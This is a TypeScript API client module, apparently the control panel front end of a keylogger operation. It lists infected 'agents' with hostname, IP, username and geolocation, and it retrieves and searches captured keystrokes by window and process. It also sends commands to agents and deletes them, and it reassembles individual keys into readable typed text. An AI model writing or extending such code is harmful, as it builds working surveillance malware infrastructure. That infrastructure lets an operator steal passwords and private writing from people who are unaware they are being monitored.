import type { ApiAgent, ApiAgentsResponse, ApiKeystroke, AgentConfig, HourlyActivity } from "../types";

const ENV_BASE = import.meta.env.VITE_API_BASE_URL;
const API_BASE = ENV_BASE ?? "";

async function fetchJson<T>(path: string, options?: RequestInit): Promise<T> {
  const res = await fetch(`${API_BASE}${path}`, {
    headers: { "Content-Type": "application/json" },
    ...options,
  });
  if (!res.ok) throw new Error(`API error ${res.status}: ${res.statusText}`);
  return res.json();
}

export const api = {
  /* ── Agents ── */

  listAgents: () =>
    fetchJson<ApiAgentsResponse>("/api/agents"),

  getAgent: (id: string) =>
    fetchJson<ApiAgent>(`/api/agents/${id}`),

  updateAgentConfig: (id: string, config: Partial<AgentConfig>) =>
    fetchJson<AgentConfig>(`/api/agents/${id}/config`, {
      method: "PUT",
      body: JSON.stringify(config),
    }),

  sendAgentAction: (id: string, action: string) =>
    fetchJson<{ status: string }>(`/api/agents/${id}/action`, {
      method: "POST",
      body: JSON.stringify({ action }),
    }),

  deleteAgent: (id: string) =>
    fetchJson<{ status: string }>(`/api/agents/${id}`, {
      method: "DELETE",
    }),

  /* ── Keystrokes ── */

  listKeystrokes: (params?: {
    since?: string;
    search?: string;
    agentId?: string;
    limit?: number;
  }) => {
    const qp = new URLSearchParams();
    if (params?.since) qp.set("since", params.since);
    if (params?.search) qp.set("search", params.search);
    if (params?.agentId) qp.set("agent_id", params.agentId);
    if (params?.limit !== undefined) qp.set("limit", String(params.limit));
    return fetchJson<ApiKeystroke[]>(`/api/keystrokes?${qp.toString()}`);
  },

  getAgentKeystrokes: (agentId: string, params?: { since?: string; limit?: number }) => {
    const qp = new URLSearchParams();
    if (params?.since) qp.set("since", params.since);
    if (params?.limit) qp.set("limit", String(params.limit ?? 200));
    return fetchJson<ApiKeystroke[]>(`/api/agents/${agentId}/keystrokes?${qp.toString()}`);
  },

  /* ── Activity ── */

  getActivity: (agentId: string) =>
    fetchJson<HourlyActivity[]>(`/api/agents/${agentId}/activity`),

  getAgentConfig: (agentId: string) =>
    fetchJson<AgentConfig>(`/api/agents/${agentId}/config`),
};

/* ── Transform helpers (snake_case API → camelCase UI) ── */

export function mapApiAgentToUi(api: ApiAgent) {
  const now = new Date();
  const lastSeen = new Date(api.last_seen_utc);
  const diffSec = Math.max(0, (now.getTime() - lastSeen.getTime()) / 1000);

  let status: "active" | "idle" | "offline";
  if (diffSec < 30) {
    status = "active";
  } else if (diffSec < 300) {
    status = "idle";
  } else {
    status = "offline";
  }

  let lastSeenDisplay: string;
  if (diffSec < 60) {
    lastSeenDisplay = `${Math.floor(diffSec)}s ago`;
  } else if (diffSec < 3600) {
    lastSeenDisplay = `${Math.floor(diffSec / 60)}m ago`;
  } else {
    lastSeenDisplay = `${Math.floor(diffSec / 3600)}h ago`;
  }

  return {
    id: api.id,
    hostname: api.hostname,
    ip: api.ip,
    os: api.os,
    version: api.version || "0.0.0",
    keystrokeCount: api.keystroke_count,
    status,
    lastSeen: lastSeenDisplay,
    activityHistory: api.activity_history,
    username: api.username,
    firstSeen: api.first_seen_utc,
    country: api.country,
    countryCode: api.country_code,
    city: api.city,
    latitude: api.latitude,
    longitude: api.longitude,
  };
}

/* Buffer individual key_char API entries into display groups.
 * Consecutive keystrokes from the same agent+window+process within
 * a short time window are concatenated into a `text` string. */
export interface BufferedKeystroke {
  id: string;
  agentId: string;
  agentHostname: string;
  timestamp: string;
  windowTitle: string;
  process: string;
  text: string;
}

export function bufferKeystrokes(apiEntries: ApiKeystroke[], gapMs = 500): BufferedKeystroke[] {
  const grouped: BufferedKeystroke[] = [];
  const sorted = [...apiEntries].sort(
    (a, b) => new Date(a.timestamp_utc).getTime() - new Date(b.timestamp_utc).getTime()
  );

  let lastEntryTs = 0; /* epoch ms of the last API entry in the current group */

  for (const entry of sorted) {
    const entryTs = new Date(entry.timestamp_utc).getTime();
    const timeStr = new Date(entry.timestamp_utc).toTimeString().slice(0, 8);
    const key = `${entry.agent_id}|${entry.window_title}|${entry.process_name}`;

    const last = grouped[grouped.length - 1];
    const lastKey = last
      ? `${last.agentId}|${last.windowTitle}|${last.process}`
      : null;

    if (
      last &&
      lastKey === key &&
      entryTs - lastEntryTs < gapMs
    ) {
      last.text += entry.key_char.startsWith("[") ? "" : entry.key_char;
    } else {
      grouped.push({
        id: entry.id,
        agentId: entry.agent_id,
        agentHostname: entry.agent_hostname,
        timestamp: timeStr,
        windowTitle: entry.window_title,
        process: entry.process_name,
        text: entry.key_char.startsWith("[") ? entry.key_char : entry.key_char,
      });
    }
    lastEntryTs = entryTs;
  }

  return grouped;
}
